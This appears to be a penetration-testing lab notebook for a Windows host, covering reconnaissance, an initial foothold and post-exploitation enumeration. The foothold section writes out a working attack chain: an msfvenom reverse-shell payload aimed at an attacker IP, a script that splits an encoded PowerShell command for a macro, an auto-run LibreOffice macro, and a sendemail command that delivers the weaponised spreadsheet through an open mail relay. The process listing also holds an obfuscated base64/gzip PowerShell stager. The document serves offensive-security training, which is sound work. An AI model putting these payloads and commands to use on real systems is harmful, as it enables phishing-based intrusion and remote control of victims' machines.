33006/tcp open  mysql   MariaDB 10.3.24 or later (unauthorized)
| mysql-enum: 
|   Accounts: No valid accounts found
|_  Statistics: Performed 10 guesses in 1 seconds, average tps: 10.0
|_mysql-empty-password: Host '192.168.45.215' is not allowed to connect to this MariaDB server
| mysql-brute: 
|   Accounts: No valid accounts found
|_  Statistics: Performed 50009 guesses in 439 seconds, average tps: 113.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 439.48 seconds
                                                                    
```
 
14. Possible Exploits

```
- With an open realy and mailserver that will process libre docs, possible exploit would be sending a malicous doc via open relay. 

|_smtp-open-relay: Server is an open relay (2/16 tests)

Team,

We will be changing our office suite to LibreOffice. For the moment, all the spreadsheets and documents will be first procesed in the mail server directly to check the compatibility. 

I will forward all the documents after checking everything is working okay. 

Sorry for the inconveniences.


```

11. Other Notes

```

```

**Initial Foothold** 

1. Exploit Steps

- Created malicious payload using msfvenom.

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.215 LPORT=445 -f hta-psh -o evil.hta
```

- Split the payload for easy placement in macro. 

```
nano splitter.py

s = "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAO...=="
n = 50
for i in range (0, len(s), n):
        chunk = s[i:i + n]
```

- Created malicious macro in .ods file.
![[Pasted image 20260226101153.png]]

- Configured macro to execute on open. 
![[Pasted image 20260226101343.png]]

- Another option is to use MMG-LO-main to build a malicous macro in Libre Office.

```
python3 ~/Tools/PythonScripts/MMG-LO-main/mmg-ods.py windows 192.168.45.215 4444
```

- Crafted and sent malicious e-mail.

```
sendemail -f 'jonas@localhost' \
-t 'mailadmin@localhost' \
-s 192.168.148.140:25 \
-u 'a spreadsheet' \
-m 'Please check this spreadsheet' \
-a exploit.ods
```

- Received reverse shell.
![[Pasted image 20260226184923.png]]

2. Shell Access

```

```

**Post-Exploitation**

1. Shell / Context (reference)

```

# Powershell

powershell -NoP -NonI -W Hidden -Exec Bypass
set-alias wget Invoke-WebRequest
set-alias curl Invoke-WebRequest

```
  
2. Identity & System Info

```

1) Identity & System Info
================================================================================

[+] Host identity (OSCP summary)
User: HEPET\Ela Arwel
Hostname: HEPET
Domain joined: False
Domain/Workgroup: WORKGROUP
OS: Microsoft Windows 10 Pro 10.0.19042 (Build 19042)
Architecture: 64-bit
Last boot: 03/04/2025 06:34:46

[+] Patch level (hotfix IDs only, first 25)
$ wmic qfe get HotFixID,InstalledOn | findstr /R /V \
ERROR: FINDSTR: No search strings
Command exit code: 2


```

3. Environment

```
2) Environment
================================================================================

[+] Environment variables (full)
Name                           Value
----                           -----
ALLUSERSPROFILE                C:\ProgramData
APPDATA                        C:\Users\Ela Arwel\AppData\Roaming
CommonProgramFiles             C:\Program Files (x86)\Common Files
CommonProgramFiles(x86)        C:\Program Files (x86)\Common Files
CommonProgramW6432             C:\Program Files\Common Files
COMPUTERNAME                   HEPET
ComSpec                        C:\WINDOWS\system32\cmd.exe
DriverData                     C:\Windows\System32\Drivers\DriverData
HOMEDRIVE                      C:
HOMEPATH                       \Users\Ela Arwel
jFGIzbODvg                     cKHrbZCkaT
LAlPpfVDbF                     VlAfkWyZZz
LANGUAGE                       en_US.UTF-8
LIBO_VERSION                   7.0.2.2
LOCALAPPDATA                   C:\Users\Ela Arwel\AppData\Local
LOGONSERVER                    \\HEPET
nPoSWPRyAa                     sexiKYtxKY
NUMBER_OF_PROCESSORS           2
OneDrive                       C:\Users\Ela Arwel\OneDrive
OS                             Windows_NT
Path                           C:\Program Files\LibreOffice\program;C:\Program Files\LibreOffice\;C:\Program Files (x86)\Common Files\Oracle\Java\javapath;C:\WINDOWS\system32;C:\WINDOWS;C:\WINDOWS\System32\Wbem;C:\WINDOWS\System32\WindowsPowerShell\v1.0\;C:\WINDOWS\System32\OpenSSH\;C:\Users\Ela Arwel\AppData\Local\Microsoft\WindowsApps
PATHEXT                        .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
PROCESSOR_ARCHITECTURE         x86
PROCESSOR_ARCHITEW6432         AMD64
PROCESSOR_IDENTIFIER           AMD64 Family 25 Model 1 Stepping 1, AuthenticAMD
PROCESSOR_LEVEL                25
PROCESSOR_REVISION             0101
ProgramData                    C:\ProgramData
ProgramFiles                   C:\Program Files (x86)
ProgramFiles(x86)              C:\Program Files (x86)
ProgramW6432                   C:\Program Files
PROMPT                         $P$G
PSExecutionPolicyPreference    Bypass
PSModulePath                   C:\Users\Ela Arwel\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Program Files (x86)\WindowsPowerShell\Modules;C:\WINDOWS\system32\WindowsPowerShell\v1.0\Modules
PUBLIC                         C:\Users\Public
RrgDcpBQSc                     dqcPmaoCQK
SystemDrive                    C:
SystemRoot                     C:\WINDOWS
TEMP                           C:\Users\ELAARW~1\AppData\Local\Temp
TMP                            C:\Users\ELAARW~1\AppData\Local\Temp
URE_BOOTSTRAP                  file:///C:/Program%20Files/LibreOffice/program/fundamental.ini
USERDOMAIN                     HEPET
USERDOMAIN_ROAMINGPROFILE      HEPET
USERNAME                       Ela Arwel
USERPROFILE                    C:\Users\Ela Arwel
windir                         C:\WINDOWS


```

  4. Users & Groups

```

3) Users & Groups
================================================================================

[+] Local admins and privileged groups (summary)
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain
Members
-------------------------------------------------------------------------------
Administrator
The command completed successfully.

[+] Local user accounts with risky settings
Get-LocalUser unavailable.

[+] Current user groups (token groups)
$ whoami /groups
GROUP INFORMATION
-----------------
Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192


```

  5.  AD Enumeration

```
[+] AD context (low-noise)
Host is not domain joined.

```

  6. Privileges & Tokens

```
5) Privileges & Tokens
================================================================================

[+] whoami /priv (full)
$ whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled

[+] Integrity level
$ whoami /groups | findstr /I \
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192

```

  7. UAC & Policy Checks

```
6) UAC & Policy Checks
================================================================================

[+] UAC / token filter / AlwaysInstallElevated (interpreted)
EnableLUA: 1
  -> UAC is enabled.
ConsentPromptBehaviorAdmin: 5
  -> Prompt for consent (non-Windows binaries).
LocalAccountTokenFilterPolicy:
  -> Value not present (treat as default: enabled).
AlwaysInstallElevated HKLM:
AlwaysInstallElevated HKCU:
  -> Not directly vulnerable via AlwaysInstallElevated (both hives are not set to 1).


```

  8. Processes & Services

```

7) Processes & Services
================================================================================

[+] Auto-start service triage (non-system paths)
Name      : edgeupdate
StartName : LocalSystem
StartMode : Auto
State     : Stopped
PathName  : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc
Name      : VeyonService
StartName : LocalSystem
StartMode : Auto
State     : Running
PathName  : C:\Users\Ela Arwel\Veyon\veyon-service.exe
Name      : VGAuthService
StartName : LocalSystem
StartMode : Auto
State     : Running
PathName  : "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"
Name      : VMTools
StartName : LocalSystem
StartMode : Auto
State     : Running
PathName  : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"

[+] Unquoted service path candidates (privesc)
Name      : VeyonService
StartName : LocalSystem
StartMode : Auto
State     : Running
PathName  : C:\Users\Ela Arwel\Veyon\veyon-service.exe

[+] Writable service binary candidates (privesc)
(no output)

[+] All running processes (full)
Name                         PID PPID User            Path                                                                                                      Command
----                         --- ---- ----            ----                                                                                                      -------
ApplicationFrameHost.exe    4708  736 HEPET\Ela Arwel C:\WINDOWS\system32\ApplicationFrameHost.exe                                                              C:\WINDOWS\system32\ApplicationFrameHost.exe -Embedding
cmd.exe                     8680 6072 HEPET\Ela Arwel C:\WINDOWS\SysWOW64\cmd.exe                                                                               cmd
conhost.exe                 2956 6072 HEPET\Ela Arwel C:\WINDOWS\system32\conhost.exe                                                                           \??\C:\WINDOWS\system32\conhost.exe 0x4
conhost.exe                 6292  744 HEPET\Ela Arwel C:\WINDOWS\system32\conhost.exe                                                                           \??\C:\WINDOWS\system32\conhost.exe 0x4
csrss.exe                    424  416
csrss.exe                    508  488
ctfmon.exe                  4356 4320 HEPET\Ela Arwel
dllhost.exe                 3696  628
dllhost.exe                 6288  736 HEPET\Ela Arwel C:\WINDOWS\system32\DllHost.exe                                                                           C:\WINDOWS\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}
dwm.exe                      992  588
explorer.exe                5020 4988 HEPET\Ela Arwel C:\WINDOWS\Explorer.EXE                                                                                   C:\WINDOWS\Explorer.EXE
FileZillaServer.exe         3520 6972 HEPET\Ela Arwel c:\xampp\filezillaftp\filezillaserver.exe                                                                 c:\xampp\filezillaftp\filezillaserver.exe -compat -start
fontdrvhost.exe              752  588
fontdrvhost.exe              760  496
httpd.exe                    744 6972 HEPET\Ela Arwel c:\xampp\apache\bin\httpd.exe                                                                             c:\xampp\apache\bin\httpd.exe
httpd.exe                   5616  744 HEPET\Ela Arwel C:\xampp\apache\bin\httpd.exe                                                                             C:\xampp\apache\bin\httpd.exe -d C:/xampp/apache
jusched.exe                 7044 6944 HEPET\Ela Arwel C:\Program Files (x86)\Common Files\Java\Java Update\jusched.exe                                          "C:\Program Files (x86)\Common Files\Java\Java Update\jusched.exe"
lsass.exe                    644  496
Memory Compression          1248    4
mercury.exe                  268 6972 HEPET\Ela Arwel c:\xampp\MercuryMail\mercury.exe                                                                          c:\xampp\MercuryMail\mercury.exe
MicrosoftEdgeUpdate.exe     7156 7872
MoUsoCoreWorker.exe         4948  736
msdtc.exe                   3888  628
mysqld.exe                  3276 6972 HEPET\Ela Arwel c:\xampp\mysql\bin\mysqld.exe                                                                             "c:\xampp\mysql\bin\mysqld.exe" --defaults-file="c:\xampp\mysql\bin\my.ini" --standalone
powershell.exe              6072 7000 HEPET\Ela Arwel C:\WINDOWS\syswow64\WindowsPowerShell\v1.0\powershell.exe                                                 "C:\WINDOWS\syswow64\WindowsPowerShell\v1.0\powershell.exe" -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4sIAN/JoGkCA71W+2+b'+'SBD+vVL/B1{2}ZAiTHr/iaJlKlAz9xTGKbgGO71onAAmuvW{2}cWv3r9328WQ+IoyV3upB6SZdid137zzcx6SegwTENha0wWa+HHxw9C9gzsyF4JUmGzn'+'6hFobAbyU97haS+F74K0kxZr5t0ZeNw{1}nXVSKIIhez4XeogpsQxWj0QjGJJFv4UxgGK0NntwwI5TPghFP4odQh9sEkmtm/YToCEMyV0+V6{1}OjYPrGSsCWa'+'S+O2bKM/OqvNS63tik1gSjX3M0KrkEiLKwk+ZO7zbr5Ek6tiJaEw9Vhrj8LxWMsPY9tANWNsgHbGA'+'urEIZ3k6TY{2}YEoXpobiVo4wkwusgoo7iuhGKY7EozLj92Xz+uzTLnI+SkOEVKmkhQxFdGyjaYA{1}Fpa4dugSNkDcHLYNFOPTnsgxiG7pEUiFMCCkK/8aMdIO2OXTvVZJOlUBqwCK5CAl9eUyduglB{2}0XxlThTDsjwHHkA4P3k+Hk5d9i10n6FOk8L+TNLdxAELA1ojFPlr0KlKOjg22Y04qwq3EUJkuePcIPPqPheW9VcEdSIeenC0syi2J0/GXiW+8L3zhcu8za{2}m8j'+'DIWruQ3uFnZyr0msJQ{2}5BKSClXOwGApTEbAO5TUSQbzOOMe{1}F'+'C7XWCrNHXTXBxEW{2}4kBSY4gK8i0/D+aYNknUQh2tALvjNxC14EGFoFw6q4p97p1/g5DYIHYcF4VBAiXqFAUD2QS5{2}UEJY5x'+'tKQmj6av4FK6eE'+'IYdO2a5ubn8HM3Ma4OGMYsSB5IKCNwZa+{2}gm3BAikIXu0jdG9jPvYuvwtGwCYHKAUsbSAescBgMxqkSuZ'+'yKkVwyENNWa4JWIJH2izax{1}egOWXWkzLJ95Iqv{2}5kXwZHxHJUcjpMYIdUGoawoW'+'Dhi0Hw4wpxb/yGEl02Hx9KIUJYXKa+tmbpnnP'+'yF+H7X5'+'QTN4EnBiBgA0Y7oSrVj9Ll+bDDSp/ItbijwTLSQ6I66xFVli6uaDj8Tn2u0eeFe9xbdctTcBZ6ixZreHTSH3W590zOsOjNaGrseaExv3S8WhtIdm{2}M21ZTuHa4sJ/XDuocP{2}l9xJ7vy54N62FbU3WHhu96k6Xn+hWeMqr+1'+'cX/cGKqVmt1vtpL+WN2qlXrcwtvuEJvDZa/NHiYWsU2v7N9XL22860cLq0r1g6YoneDcO{1}Q8qxPo7n7SLV+O60ulpSiNsGW1VXo9USNlULbMtjo0W+pwCGu{1}/bJXhzVSo21bb9C+61LFV9SkHq7sQB1bNTxd348CsNWGEP{2}ypa65aEe/9M{1}Y2pQtu3PDpkqjV6+699ahW7OD3t{2}K+p{1}T2G31mltVmV{2}bPbXZUVoj02xPx9ZyOr4j07FZnVLkbMsB2MBIvbWWD2W942vBruqDr'+'4vU/gqvy'+'EPNLV+aX9{2}we+0PNr47HF+M'+'dj{1}7hxpVzHLZ+gTJnpk4ZOe1eWFbDae8F378UGA3E/Mk5W81et2O4sAmQAVo4Xk1tmnUztrygGKuIUnH0b5EUYgIzEOYmDmTFUKow4dC2sFhIB3HBJ9appbG9dqbLDwKyk/TIl+6uppCmFAbnLmlPgp9FhQru/NKB{1}p8ZVepp2Xw/sM16HovpcaK{1}FKk6OTWSWodDGJPkKT/ATC4EDDoTm9D9hZ'+'64HwJ/QS627HMOYYqpeQUwexoj5Q4B{2}CQq8LpZ/wykHIFLJyh7wAHH5anw7ewCIJw8ov5k3WsAP7c{'+'1}+LP09'+'r{1}7L6LU5XiEaIXy88XTlr9r8{2}gbGMGogb0XoKOV4HXociq5iT{2}aYqgKLzs4d{1}j24Sd3cCFKx0A{1}wFkvVNFlwsAAA{0}{0}')-f'=','f','R')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
powershell.exe              7824 7976 HEPET\Ela Arwel C:\WINDOWS\SysWOW64\WindowsPowerShell\v1.0\powershell.exe                                                 "C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe" -ExecutionPolicy Bypass -File .\pg_privesc.ps1
powershell.exe              7976 8680 HEPET\Ela Arwel C:\WINDOWS\SysWOW64\WindowsPowerShell\v1.0\powershell.exe                                                 powershell
Registry                      92    4
RuntimeBroker.exe           2536  736 HEPET\Ela Arwel C:\Windows\System32\RuntimeBroker.exe                                                                     C:\Windows\System32\RuntimeBroker.exe -Embedding
RuntimeBroker.exe           5040  736 HEPET\Ela Arwel C:\Windows\System32\RuntimeBroker.exe                                                                     C:\Windows\System32\RuntimeBroker.exe -Embedding
RuntimeBroker.exe           5552  736 HEPET\Ela Arwel C:\Windows\System32\RuntimeBroker.exe                                                                     C:\Windows\System32\RuntimeBroker.exe -Embedding
RuntimeBroker.exe           5824  736 HEPET\Ela Arwel C:\Windows\System32\RuntimeBroker.exe                                                                     C:\Windows\System32\RuntimeBroker.exe -Embedding
RuntimeBroker.exe           6256  736 HEPET\Ela Arwel C:\Windows\System32\RuntimeBroker.exe                                                                     C:\Windows\System32\RuntimeBroker.exe -Embedding
SearchApp.exe               5712  736 HEPET\Ela Arwel C:\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\SearchApp.exe                                "C:\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\SearchApp.exe" -ServerName:CortanaUI.AppX8z9r6jm96hw4bsbneegw0kyxx296wr9t.mca
SearchFilterHost.exe        7392 4960
SearchIndexer.exe           4960  628
SearchProtocolHost.exe        64 4960
SecurityHealthService.exe   6780  628
SecurityHealthSystray.exe   6748 5020 HEPET\Ela Arwel C:\Windows\System32\SecurityHealthSystray.exe                                                             "C:\Windows\System32\SecurityHealthSystray.exe"
services.exe                 628  496
SgrmBroker.exe              4632  628
ShellExperienceHost.exe     3460  736 HEPET\Ela Arwel C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe                           "C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe" -ServerName:App.AppXtk181tbxbce2qsex02s8tw7hfxa9xb3t.mca
sihost.exe                  2760 1076 HEPET\Ela Arwel C:\WINDOWS\system32\sihost.exe                                                                            sihost.exe
smss.exe                     316    4
StartMenuExperienceHost.exe 5436  736 HEPET\Ela Arwel C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\StartMenuExperienceHost.exe "C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\StartMenuExperienceHost.exe" -ServerName:App.AppXywbrabmsek0gm3tkwpr5kwzbs55tkqay.mca
svchost.exe                  284  628
svchost.exe                  332  628
svchost.exe                  512  628
svchost.exe                  736  628
svchost.exe                  768  628
svchost.exe                  864  628
svchost.exe                  912  628
svchost.exe                  960  628
svchost.exe                 1076  628
svchost.exe                 1112  628
svchost.exe                 1168  628
svchost.exe                 1176  628
svchost.exe                 1204  628
svchost.exe                 1212  628
svchost.exe                 1284  628
svchost.exe                 1300  628
svchost.exe                 1308  628
svchost.exe                 1316  628
svchost.exe                 1340  628 HEPET\Ela Arwel C:\WINDOWS\system32\svchost.exe                                                                           C:\WINDOWS\system32\svchost.exe -k ClipboardSvcGroup -p -s cbdhsvc
svchost.exe                 1432  628
svchost.exe                 1492  628
svchost.exe                 1504  628
svchost.exe                 1528  628
svchost.exe                 1552  628
svchost.exe                 1596  628
svchost.exe                 1648  628
svchost.exe                 1712  628
svchost.exe                 1816  628
svchost.exe                 1836  628
svchost.exe                 1852  628
svchost.exe                 1872  628
svchost.exe                 1976  628
svchost.exe                 1984  628
svchost.exe                 2028  628
svchost.exe                 2164  628
svchost.exe                 2172  628
svchost.exe                 2272  628 HEPET\Ela Arwel C:\WINDOWS\system32\svchost.exe                                                                           C:\WINDOWS\system32\svchost.exe -k UnistackSvcGroup -s WpnUserService
svchost.exe                 2404  628
svchost.exe                 2428  628
svchost.exe                 2436  628
svchost.exe                 2492  628
svchost.exe                 2500  628
svchost.exe                 2512  628
svchost.exe                 2524  628
svchost.exe                 2552  628
svchost.exe                 2580  628
svchost.exe                 2604  628
svchost.exe                 2632  628
svchost.exe                 2640  628
svchost.exe                 2656  628
svchost.exe                 2672  628
svchost.exe                 2696  628
svchost.exe                 2984  628
svchost.exe                 3164  628
svchost.exe                 4012  628 HEPET\Ela Arwel C:\WINDOWS\system32\svchost.exe                                                                           C:\WINDOWS\system32\svchost.exe -k UnistackSvcGroup -s CDPUserSvc
svchost.exe                 4320  628
svchost.exe                 4448  628
svchost.exe                 4624  628
svchost.exe                 5600  628
svchost.exe                 5948  628 HEPET\Ela Arwel C:\WINDOWS\system32\svchost.exe                                                                           C:\WINDOWS\system32\svchost.exe -k UnistackSvcGroup
svchost.exe                 6568  628
svchost.exe                 6580  628
svchost.exe                 7208  628
svchost.exe                 7428  628
svchost.exe                 7744  628
svchost.exe                 8228  628
svchost.exe                 8904  628
System                         4    0
System Idle Process            0    0
taskhostw.exe               2284  512 HEPET\Ela Arwel C:\WINDOWS\system32\taskhostw.exe                                                                         taskhostw.exe
taskhostw.exe               4124  512 HEPET\Ela Arwel C:\WINDOWS\system32\taskhostw.exe                                                                         taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}
TiWorker.exe                1748  736
TrustedInstaller.exe        3304  628
UserOOBEBroker.exe          2208  736 HEPET\Ela Arwel C:\Windows\System32\oobe\UserOOBEBroker.exe                                                               C:\Windows\System32\oobe\UserOOBEBroker.exe -Embedding
veyon-server.exe            4524 2588
veyon-service.exe           2588  628
veyon-worker.exe            4548 4524 HEPET\Ela Arwel C:\Users\Ela Arwel\Veyon\veyon-worker.exe                                                                 "C:\Users\Ela Arwel\Veyon\veyon-worker.exe" {8e997d84-ebb9-430f-8f72-d45d9821963d}
VGAuthService.exe           2596  628
vmtoolsd.exe                2624  628
vmtoolsd.exe                6892 5020 HEPET\Ela Arwel C:\Program Files\VMware\VMware Tools\vmtoolsd.exe                                                         "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
wininit.exe                  496  416
winlogon.exe                 588  488
WinStore.App.exe            2472  736 HEPET\Ela Arwel C:\Program Files\WindowsApps\Microsoft.WindowsStore_11910.1002.5.0_x64__8wekyb3d8bbwe\WinStore.App.exe    "C:\Program Files\WindowsApps\Microsoft.WindowsStore_11910.1002.5.0_x64__8wekyb3d8bbwe\WinStore.App.exe" -ServerName:App.AppXc75wvwned5vhz4xyxxecvgdjhdkgsdza.mca
WmiPrvSE.exe                4764  736
WmiPrvSE.exe                4776  736
xampp-control.exe           6972 5020 HEPET\Ela Arwel C:\xampp\xampp-control.exe                                                                                "C:\xampp\xampp-control.exe"

```

  9.  Scheduled Tasks

```

8) Scheduled Tasks
================================================================================

[+] Scheduled task triage (OSCP-focused)
Suspicious scheduled tasks: 93 (showing first 40)
--------------------------------------------------------------------------------
Task: \Check Email
RunAs: Ela Arwel
Why: Non-Microsoft task path; Runs as user/service account: Ela Arwel; LOLBIN launcher in action
Action: powershell.exe .\check_email.ps1
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319
RunAs: SYSTEM
Why: Hidden task
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 64
RunAs: SYSTEM
Why: Hidden task
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 64 Critical
RunAs: SYSTEM
Why: Hidden task
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 Critical
RunAs: SYSTEM
Why: Hidden task
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Application Experience\PcaPatchDbTask
RunAs: SYSTEM
Why: LOLBIN launcher in action
Action: %windir%\system32\rundll32.exe %windir%\system32\PcaSvc.dll,PcaPatchSdbTask
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Application Experience\StartupAppTask
Why: LOLBIN launcher in action
Action: %windir%\system32\rundll32.exe Startupscan.dll,SusRunTask
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\ApplicationData\CleanupTemporaryState
RunAs: SYSTEM
Why: LOLBIN launcher in action
Action: %windir%\system32\rundll32.exe Windows.Storage.ApplicationData.dll,CleanupTemporaryState
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\AppxDeploymentClient\Pre-staged app cleanup
RunAs: SYSTEM
Why: Hidden task; LOLBIN launcher in action
Action: %windir%\system32\rundll32.exe %windir%\system32\AppxDeploymentClient.dll,AppxPreStageCleanupRunTask
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Autochk\Proxy
RunAs: SYSTEM
Why: LOLBIN launcher in action
Action: %windir%\system32\rundll32.exe /d acproxy.dll,PerformAutochkOperations
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\BrokerInfrastructure\BgTaskRegistrationMaintenanceTask
RunAs: SYSTEM
RunLevel: Highest
Why: Runs with highest privileges
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Chkdsk\SyspartRepair
RunAs: SYSTEM
Why: Hidden task
Action: %windir%\system32\bcdboot.exe %windir% /sysrepair
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\CloudExperienceHost\CreateObjectTask
RunAs: SYSTEM
Why: Hidden task
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Customer Experience Improvement Program\UsbCeip
RunAs: SYSTEM
Why: Hidden task
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Data Integrity Scan\Data Integrity Check And Scan
RunAs: SYSTEM
RunLevel: Highest
Why: Runs with highest privileges
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Data Integrity Scan\Data Integrity Scan
RunAs: SYSTEM
RunLevel: Highest
Why: Runs with highest privileges
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Data Integrity Scan\Data Integrity Scan for Crash Recovery
RunAs: SYSTEM
RunLevel: Highest
Why: Runs with highest privileges; Hidden task
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Defrag\ScheduledDefrag
RunAs: SYSTEM
RunLevel: Highest
Why: Runs with highest privileges
Action: %windir%\system32\defrag.exe -c -h -o -$
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Diagnosis\RecommendedTroubleshootingScanner
RunAs: SYSTEM
RunLevel: Highest
Why: Runs with highest privileges
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Diagnosis\Scheduled
RunLevel: Highest
Why: Runs with highest privileges; Hidden task
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\DirectX\DirectXDatabaseUpdater
RunAs: SYSTEM
RunLevel: Highest
Why: Runs with highest privileges; Hidden task
Action: %windir%\system32\directxdatabaseupdater.exe
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\DirectX\DXGIAdapterCache
RunAs: SYSTEM
RunLevel: Highest
Why: Runs with highest privileges; Hidden task
Action: %windir%\system32\dxgiadaptercache.exe
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\DiskCleanup\SilentCleanup
RunLevel: Highest
Why: Runs with highest privileges
Action: %windir%\system32\cleanmgr.exe /autoclean /d %systemdrive%
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticDataCollector
RunAs: SYSTEM
Why: Hidden task; LOLBIN launcher in action
Action: %windir%\system32\rundll32.exe dfdts.dll,DfdGetDefaultPolicyAndSMART
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticResolver
RunLevel: Highest
Why: Runs with highest privileges; Hidden task
Action: %windir%\system32\DFDWiz.exe
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\DiskFootprint\Diagnostics
RunAs: SYSTEM
RunLevel: Highest
Why: Runs with highest privileges
Action: %windir%\system32\disksnapshot.exe -z
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\DiskFootprint\StorageSense
RunLevel: Highest
Why: Runs with highest privileges
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Feedback\Siuf\DmClient
RunAs: SYSTEM
RunLevel: Highest
Why: Runs with highest privileges
Action: %windir%\system32\dmclient.exe
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Feedback\Siuf\DmClientOnScenarioDownload
RunAs: SYSTEM
RunLevel: Highest
Why: Runs with highest privileges
Action: %windir%\system32\dmclient.exe utcwnf
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\File Classification Infrastructure\Property Definition Sync
RunAs: SYSTEM
RunLevel: Highest
Why: Runs with highest privileges
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Input\LocalUserSyncDataAvailable
RunLevel: Highest
Why: Runs with highest privileges
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Input\MouseSyncDataAvailable
RunLevel: Highest
Why: Runs with highest privileges
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Input\PenSyncDataAvailable
RunLevel: Highest
Why: Runs with highest privileges
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Input\TouchpadSyncDataAvailable
RunLevel: Highest
Why: Runs with highest privileges
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Maintenance\WinSAT
RunLevel: Highest
Why: Runs with highest privileges
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Management\Provisioning\Cellular
RunAs: SYSTEM
RunLevel: Highest
Why: Runs with highest privileges; Hidden task
Action: %windir%\system32\ProvTool.exe /turn 7 /source CellStateChangeTask
--------------------------------------------------------------------------------
